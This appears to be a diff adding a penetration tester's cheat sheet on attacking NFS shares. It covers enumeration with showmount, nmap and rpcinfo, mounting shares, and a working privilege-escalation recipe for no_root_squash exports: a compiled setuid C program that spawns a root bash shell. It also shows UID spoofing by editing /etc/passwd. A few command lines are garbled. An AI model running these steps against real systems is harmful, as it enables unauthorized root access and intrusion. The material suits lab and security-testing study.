@@ -1,1 +1,54 @@
+Show Mountable NFS Shares
+showmount -e <IP>
+nmap --script=nfs-showmount -oN mountable_shares <IP>
 
+Mount a share
+sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
+
+NFS misconfigurations
+# List exported shares
+cat /etc/exports
+
+If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.
+
+# Attacker, as root user
+mkdir <DIRECTORY>
+mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
+cd <DIRECTORY>
+echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
+gcc pwn.c -o pwn
+chmod +s pwn
+
+# Victim
+cd <SHARE>
+./pwn # Root shell
+
+- NFS(111, redirect 2049):
+    - Configuration file
+        - /etc/exports
+
+    - List mount points
+        > showmount -e 10.10.10.76
+
+    - Check version of rpc running
+        > rpcinfo -p 192.168.1.193
+            
+    - List users on system (like Finger) 
+        > rusers -al 10.10.10.76
+
+    - Mount on specific port
+        > mount > sudo mount -o port=34505 -t nfs 10.10.10.76:/some_directory /mnt/test
+
+    - other commands
+        > mount > sudo mount -t fts 10.10.10.76:/home ~/nfs-share
+        > mount > sudo mount -t nfs -o nfsvers=3 10.11.1.72:/home ~/nfs-share
+
+    - create user with UID to access mount
+        > adduser pwn
+        > sudo sed -i -e 's/1001/1014/g' /etc/passwd
+
+    > umount > sudo umount -f -l ~/nfs-share
+
+
+    
